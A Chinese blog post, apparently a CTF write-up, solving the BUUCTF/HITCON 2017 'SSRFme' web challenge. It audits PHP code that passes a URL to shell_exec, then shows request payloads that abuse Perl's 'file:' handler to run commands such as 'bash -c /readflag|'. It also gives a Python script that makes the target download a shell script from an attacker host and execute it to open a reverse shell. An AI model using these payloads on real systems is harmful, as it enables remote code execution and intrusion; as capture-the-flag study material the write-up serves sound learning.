@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这道题纯纯知识盲区呀，哭了。 审计1234567891011121314151617181910.244.80.46 &lt;?php    if (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;&#x2F;&#x2F;获取ip        $http_x_headers &#x3D; explode(&amp;#x27;,&amp;#x27;, $_SERVER[&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行">
+<meta property="og:url" content="http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="这道题纯纯知识盲区呀，哭了。 审计1234567891011121314151617181910.244.80.46 &lt;?php    if (isset($_SERVER[&amp;#x27;HTTP_X_FORWARDED_FOR&amp;#x27;])) &amp;#123;&#x2F;&#x2F;获取ip        $http_x_headers &#x3D; explode(&amp;#x27;,&amp;#x27;, $_SERVER[&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/2022-05-19-22-44-02.png">
+<meta property="article:published_time" content="2022-05-19T14:19:49.000Z">
+<meta property="article:modified_time" content="2022-05-19T14:52:23.211Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/2022-05-19-22-44-02.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/19/BUUCTF-WEB-CTF-WUSTCTF2020-CV-Maker-%E5%9B%BE%E7%89%87%E9%A9%AC%E8%BF%87exif-imagetype/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/05/19/BUUCTF-WEB-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb-sql%E6%B3%A8%E5%85%A5%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E6%97%A5%E5%BF%97%E9%A9%AC/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&text=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&is_video=false&description=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行&body=Check out this article: http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&name=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&t=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">2.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">2.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-05-19T14:19:49.000Z" itemprop="datePublished">2022-05-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这道题纯纯知识盲区呀，哭了。</p>
+<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.244</span>.<span class="number">80.46</span> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<span class="comment">//获取ip</span></span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];<span class="comment">//输出ip</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);<span class="comment">//计算沙盒文件夹名</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);<span class="comment">//创建沙盒文件夹</span></span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);<span class="comment">//进入沙河文件夹</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));<span class="comment">//执行&#x27;GET $_GET[&quot;url&quot;]&#x27;，这里是linux执行perl脚本的方式 GET+shell</span></span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);<span class="comment">//返回filename的信息</span></span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));<span class="comment">//返回路径</span></span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);<span class="comment">//创建文件路径</span></span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);<span class="comment">//进入文件路径</span></span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);<span class="comment">//输入data到basename</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h3><p>思路是 利用file，执行命令，就是perl可以通过file:来执行文件名为cmd的命令，格式是<code>GET file:cmd|</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一步：</span><br><span class="line">?url=file:ls /|&amp;filename=ls /| <span class="comment">##要请求两次，第一次通过filenmae创建‘ls /|’文件，第二次通过shell_exec 执行&#x27;GET ls /|&#x27;，进而得到目录信息，进而输入到&#x27;ls /|&#x27;文件里，我们再访问该文件即可,根据自己的ip，计算相对应的MD5(&#x27;organge&#x27;.ip)，我的就是 http://46500a1e-ea09-4d5c-8e8e-038017215545.node4.buuoj.cn:81/sandbox/230317844a87b41e1234567895/ls /|</span></span><br><span class="line">访问得到文件目录</span><br><span class="line">然后看到 readflag程序，我们需要执行它</span><br><span class="line"></span><br><span class="line">第二步：</span><br><span class="line">?url=file: ./readflag|&amp;filename= ./readflag<span class="comment">##这样的话会创建这个文件，导致无法执行该文件</span></span><br><span class="line">所以改成</span><br><span class="line">?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|<span class="comment">##请求两次，原理同上 ，得到flag。</span></span><br></pre></td></tr></table></figure>
+<p>最后访问 <code>http://46500a1e-ea09-4d5c-8e8e-038017215545.node4.buuoj.cn:81/sandbox/230317123456789/bash -c /readflag|</code>  得到flag</p>
+<p><img src="/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/2022-05-19-22-44-02.png"></p>
+<h3 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h3><p>利用远程文件读取perl脚本，反弹shell，原理同上，因为buu设置的原因，无法反弹，主要学习这个姿势</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&#x27;http://1.1.1.1/&#x27;</span> <span class="comment">##受害机</span></span><br><span class="line">shell_url = <span class="string">&#x27;http://0.0.0.0/shell.txt&#x27;</span> <span class="comment">##攻击机上的脚本</span></span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=&#x27;</span>+shell_url+<span class="string">&#x27;&amp;filename=a&#x27;</span>) <span class="comment">##读取攻击脚本并输入到a</span></span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=&amp;filename=bash a|&#x27;</span>) <span class="comment">##创建文件名 bash a|</span></span><br><span class="line">r=requests.get(url+<span class="string">&#x27;?url=file:bash a|&amp;filename=xxx&#x27;</span>) <span class="comment">##执行 bash a|，反弹shell</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/03/25/HITCON-2017-SSRFme/">https://mayi077.gitee.io/2020/03/25/HITCON-2017-SSRFme/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.iloveflag.com/2019/08/07/hitcon-ctf-2017-ssrfme/">https://www.iloveflag.com/2019/08/07/hitcon-ctf-2017-ssrfme/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26711103/article/details/81666460">https://blog.csdn.net/qq_26711103/article/details/81666460</a></p>
+<p><a target="_blank" rel="noopener" href="https://lxh3ng.github.io/2021/06/08/hitcon-2017-ssrfme/">https://lxh3ng.github.io/2021/06/08/hitcon-2017-ssrfme/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/106013885">https://blog.csdn.net/SopRomeo/article/details/106013885</a></p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-1"><span class="toc-number">2.1.</span> <span class="toc-text">法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95-2"><span class="toc-number">2.2.</span> <span class="toc-text">法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&text=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&is_video=false&description=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行&body=Check out this article: http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&title=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&name=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/05/19/BUUCTF-WEB-HITCON-2017-SSRFme-linux%E4%B8%8B%E7%9A%84perl%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/&t=BUUCTF-WEB-[HITCON 2017]SSRFme linux下的perl脚本执行"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
